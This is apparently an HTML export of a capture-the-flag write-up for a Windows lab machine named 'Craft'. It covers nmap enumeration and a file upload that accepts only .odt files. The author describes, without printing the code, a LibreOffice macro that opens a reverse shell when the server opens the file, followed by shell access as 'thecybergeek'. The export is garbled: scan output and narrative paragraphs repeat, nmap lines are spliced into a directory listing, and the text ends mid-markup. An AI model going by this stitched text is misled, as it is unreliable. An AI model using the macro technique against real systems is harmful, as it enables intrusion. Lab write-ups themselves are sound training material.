4px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">┌──(kali㉿kali)-[~/Desktop]</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">└─<span class="cm-def">$ nmap</span> <span class="cm-def">$IP</span> <span class="cm-attribute">-sC</span> <span class="cm-attribute">-sV</span> <span class="cm-attribute">-p</span> <span class="cm-number">80</span> <span class="cm-attribute">-Pn</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Starting Nmap <span class="cm-number">7</span>.95 ( &lt;https://nmap.org&gt; ) at <span class="cm-number">2026</span><span class="cm-attribute">-01-17</span> <span class="cm-number">16</span>:05 UTC</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Nmap scan report <span class="cm-keyword">for</span> <span class="cm-number">192</span>.168.164.169</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Host is up (0.045s latency).</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
 </span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">PORT &nbsp; STATE SERVICE VERSION</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-number">80</span>/tcp open  http &nbsp;  Apache httpd <span class="cm-number">2</span>.4.48 ((Win64) OpenSSL/1.1.1k PHP/8.0.7)</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">|_http-title: Craft</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">|_http-server-header: Apache/2.4.48 (Win64) OpenSSL/1.1.1k PHP/8.0.7</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
-</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Service detection performed. Please report any incorrect results at &lt;https://nmap.org/submit/&gt; .</span></pre><div class="" style="position: relative;"><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Nmap <span class="cm-keyword">done</span>: <span class="cm-number">1</span> IP address (1 host up) scanned <span class="cm-keyword">in</span> <span class="cm-number">11</span>.89 seconds</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 346px;"></div><div class="CodeMirror-gutters" style="display: none; height: 346px;"></div></div></div></pre><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang="bash" style="break-inside: unset;"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="bash"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 10.3438px; left: 4px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">┌──(kali㉿kali)-[~/Desktop]</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">└─<span class="cm-def">$ nmap</span> <span class="cm-def">$IP</span> <span class="cm-attribute">-sU</span> <span class="cm-attribute">--top-ports</span> <span class="cm-number">10</span> <span class="cm-attribute">-Pn</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Starting Nmap <span class="cm-number">7</span>.95 ( &lt;https://nmap.org&gt; ) at <span class="cm-number">2026</span><span class="cm-attribute">-01-17</span> <span class="cm-number">16</span>:08 UTC</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Nmap scan report <span class="cm-keyword">for</span> <span class="cm-number">192</span>.168.164.169</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Host is up.</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
+</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Service detection performed. Please report any incorrect results at &lt;https://nmap.org/submit/&gt; .</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Nmap <span class="cm-keyword">done</span>: <span class="cm-number">1</span> IP address (1 host up) scanned <span class="cm-keyword">in</span> <span class="cm-number">11</span>.89 seconds</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 285px;"></div><div class="CodeMirror-gutters" style="display: none; height: 285px;"></div></div></div></pre><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang="bash" style="break-inside: unset;"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="bash"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 8.96875px; left: 4px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">┌──(kali㉿kali)-[~/Desktop]</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">└─<span class="cm-def">$ nmap</span> <span class="cm-def">$IP</span> <span class="cm-attribute">-sU</span> <span class="cm-attribute">--top-ports</span> <span class="cm-number">10</span> <span class="cm-attribute">-Pn</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Starting Nmap <span class="cm-number">7</span>.95 ( &lt;https://nmap.org&gt; ) at <span class="cm-number">2026</span><span class="cm-attribute">-01-17</span> <span class="cm-number">16</span>:08 UTC</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Nmap scan report <span class="cm-keyword">for</span> <span class="cm-number">192</span>.168.164.169</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Host is up.</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
 </span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">PORT &nbsp; &nbsp; STATE &nbsp; &nbsp; &nbsp; &nbsp; SERVICE</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-number">53</span>/udp &nbsp; open|filtered domain</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-number">67</span>/udp &nbsp; open|filtered dhcps</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-number">123</span>/udp  open|filtered ntp</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-number">135</span>/udp  open|filtered msrpc</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-number">137</span>/udp  open|filtered netbios-ns</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-number">138</span>/udp  open|filtered netbios-dgm</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-number">161</span>/udp  open|filtered snmp</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-number">445</span>/udp  open|filtered microsoft-ds</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-number">631</span>/udp  open|filtered ipp</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-number">1434</span>/udp open|filtered ms-sql-m</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
-</span></span></pre><div class="" style="position: relative;"><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Nmap <span class="cm-keyword">done</span>: <span class="cm-number">1</span> IP address (1 host up) scanned <span class="cm-keyword">in</span> <span class="cm-number">3</span>.23 seconds</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 469px;"></div><div class="CodeMirror-gutters" style="display: none; height: 469px;"></div></div></div></pre><h1 id='initial-access'><span>Initial Access</span></h1><h2 id='http-80'><span>HTTP 80</span></h2><p><span>Whenever I encounter an HTTP service, I run the </span><code>http-enum</code><span> Nmap script as part of my standard enumeration process. The script identified several interesting directories including </span><code>/uploads</code></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang="bash" style="break-inside: unset;"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="bash"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 10.3438px; left: 4px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">┌──(kali㉿kali)-[~/Desktop]</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">└─<span class="cm-def">$ nmap</span> <span class="cm-def">$IP</span> <span class="cm-attribute">-sV</span> <span class="cm-attribute">--script</span><span class="cm-operator">=</span>http-enum <span class="cm-attribute">-p</span> <span class="cm-number">80</span> <span class="cm-attribute">-Pn</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Starting Nmap <span class="cm-number">7</span>.95 ( &lt;https://nmap.org&gt; ) at <span class="cm-number">2026</span><span class="cm-attribute">-01-17</span> <span class="cm-number">16</span>:10 UTC</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Nmap scan report <span class="cm-keyword">for</span> <span class="cm-number">192</span>.168.164.169</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Host is up (0.045s latency).</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
+</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Nmap <span class="cm-keyword">done</span>: <span class="cm-number">1</span> IP address (1 host up) scanned <span class="cm-keyword">in</span> <span class="cm-number">3</span>.23 seconds</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 417px;"></div><div class="CodeMirror-gutters" style="display: none; height: 417px;"></div></div></div></pre><h1 id='initial-access'><span>Initial Access</span></h1><h2 id='http-80'><span>HTTP 80</span></h2><p><span>Whenever I encounter an HTTP service, I run the </span><code>http-enum</code><span> Nmap script as part of my standard enumeration process. The script identified several interesting directories including </span><code>/uploads</code></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang="bash" style="break-inside: unset;"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="bash"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 8.96875px; left: 4px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">┌──(kali㉿kali)-[~/Desktop]</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">└─<span class="cm-def">$ nmap</span> <span class="cm-def">$IP</span> <span class="cm-attribute">-sV</span> <span class="cm-attribute">--script</span><span class="cm-operator">=</span>http-enum <span class="cm-attribute">-p</span> <span class="cm-number">80</span> <span class="cm-attribute">-Pn</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Starting Nmap <span class="cm-number">7</span>.95 ( &lt;https://nmap.org&gt; ) at <span class="cm-number">2026</span><span class="cm-attribute">-01-17</span> <span class="cm-number">16</span>:10 UTC</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Nmap scan report <span class="cm-keyword">for</span> <span class="cm-number">192</span>.168.164.169</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Host is up (0.045s latency).</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
 </span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">PORT &nbsp; STATE SERVICE VERSION</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-number">80</span>/tcp open  http &nbsp;  Apache httpd <span class="cm-number">2</span>.4.48 ((Win64) OpenSSL/1.1.1k PHP/8.0.7)</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">|_http-server-header: Apache/2.4.48 (Win64) OpenSSL/1.1.1k PHP/8.0.7</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">| http-enum: </span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">| &nbsp; /css/: Potentially interesting directory w/ listing on <span class="cm-string">'apache/2.4.48 (win64) openssl/1.1.1k php/8.0.7'</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">| &nbsp; /icons/: Potentially interesting folder w/ directory listing</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">| &nbsp; /js/: Potentially interesting directory w/ listing on <span class="cm-string">'apache/2.4.48 (win64) openssl/1.1.1k php/8.0.7'</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">|_  /uploads/: Potentially interesting directory w/ listing on <span class="cm-string">'apache/2.4.48 (win64) openssl/1.1.1k php/8.0.7'</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
-</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Service detection performed. Please report any incorrect results at &lt;https://nmap.org/submit/&gt; .</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Nmap <span class="cm-keyword">done</span>: <span class="cm-number">1</span> IP address (1 host up) scanned <span class="cm-keyword">in</span> <span class="cm-number">13</span>.77 seconds</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 518px;"></div><div class="CodeMirror-gutters" style="display: none; height: 518px;"></div></div></div></pre><p><span>Upon browsing the website on port 80, I discovered a file upload functionality. In CTF scenarios, these are often vulnerable.</span></p><p><img src="./craft.assets/image-20260129105427656.png" alt="image-20260129105427656"></p><p><img src="./craft.assets/image-20260129105435408.png" alt="image-20260129105435408"></p><p><span>After testing with a random image, I found that the server only accepts </span><code>.odt</code><span> (OpenDocument Text) files.</span></p><p><img src="./craft.assets/image-20260129105441998.png" alt="image-20260129105441998"></p><p><span>I opened </span><code>LibreOffice</code><span> and created a macro containing a reverse shell payload. The macro was designed to trigger as soon as the file is opened by the server.</span></p><p><img src="./craft.assets/image-20260129105455297.png" alt="image-20260129105455297"></p><p><span>I uploaded the </span><code>.odt</code><span> file and this time it was accepted by the server.</span></p><p><img src="./craft.assets/image-20260129105504677.png" alt="image-20260129105504677"></p><p><span>After uploading </span><code>wook_payload.odt</code><span> , I navigated to the </span><code>/uploads/</code><span> directory and confirmed the file was present.</span></p><p><img src="./craft.assets/image-20260129105510851.png" alt="image-20260129105510851"></p><h1 id='shell-as-thecybergeek'><span>Shell as </span><code>thecybergeek</code></h1><p><span>Shortly after, the macro was triggered. The server retrieved the binary and I successfully obtained a reverse shell as the user </span><code>thecybergeek</code><span> .</span></p><p><img src="./craft.assets/image-20260129105518733.png" alt="image-20260129105518733"></p><p><span>I was logged in as </span><code>thecybergeek</code><span> user.</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang="bash"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="bash"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 10.3438px; left: 4px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">C:\\Program Files\\LibreOffice\\program&gt;whoami</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">whoami</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">craft\\thecybergeek</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 74px;"></div><div class="CodeMirror-gutters" style="display: none; height: 74px;"></div></div></div></pre><p><span>Found </span><code>local.txt</code></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang="bash" style="break-inside: unset;"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="bash"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 10.3438px; left: 4px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">C:\\Users\\thecybergeek\\Desktop&gt;dir</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">dir</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> Volume <span class="cm-keyword">in</span> drive C has no label.</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> Volume Serial Number is 5C30-DCD7</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
+</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Service detection performed. Please report any incorrect results at &lt;https://nmap.org/submit/&gt; .</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Nmap <span class="cm-keyword">done</span>: <span class="cm-number">1</span> IP address (1 host up) scanned <span class="cm-keyword">in</span> <span class="cm-number">13</span>.77 seconds</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 373px;"></div><div class="CodeMirror-gutters" style="display: none; height: 373px;"></div></div></div></pre><p><span>Upon browsing the website on port 80, I discovered a file upload functionality. In CTF scenarios, these are often vulnerable.</span></p><p><img src="./craft.assets/image-20260129105427656.png" alt="image-20260129105427656"></p><p><img src="./craft.assets/image-20260129105435408.png" alt="image-20260129105435408"></p><p><span>After testing with a random image, I found that the server only accepts </span><code>.odt</code><span> (OpenDocument Text) files.</span></p><p><img src="./craft.assets/image-20260129105441998.png" alt="image-20260129105441998"></p><p><span>I opened </span><code>LibreOffice</code><span> and created a macro containing a reverse shell payload. The macro was designed to trigger as soon as the file is opened by the server.</span></p><p><img src="./craft.assets/image-20260129105455297.png" alt="image-20260129105455297"></p><p><span>I uploaded the </span><code>.odt</code><span> file and this time it was accepted by the server.</span></p><p><img src="./craft.assets/image-20260129105504677.png" alt="image-20260129105504677"></p><p><span>After uploading </span><code>wook_payload.odt</code><span> , I navigated to the </span><code>/uploads/</code><span> directory and confirmed the file was present.</span></p><p><img src="./craft.assets/image-20260129105510851.png" alt="image-20260129105510851"></p><h1 id='shell-as-thecybergeek'><span>Shell as </span><code>thecybergeek</code></h1><p><span>Shortly after, the macro was triggered. The server retrieved the binary and I successfully obtained a reverse shell as the user </span><code>thecybergeek</code><span> .</span></p><p><img src="./craft.assets/image-20260129105518733.png" alt="image-20260129105518733"></p><p><span>I was logged in as </span><code>thecybergeek</code><span> user.</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang="bash"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="bash"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 8.96875px; left: 4px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">C:\\Program Files\\LibreOffice\\program&gt;whoami</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">whoami</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">craft\\thecybergeek</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 66px;"></div><div class="CodeMirror-gutters" style="display: none; height: 66px;"></div></div></div></pre><p><span>Found </span><code>local.txt</code></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang="bash" style="break-inside: unset;"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="bash"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 8.96875px; left: 4px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">C:\\Users\\thecybergeek\\Desktop&gt;dir</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">dir</span></pre><pre class=" 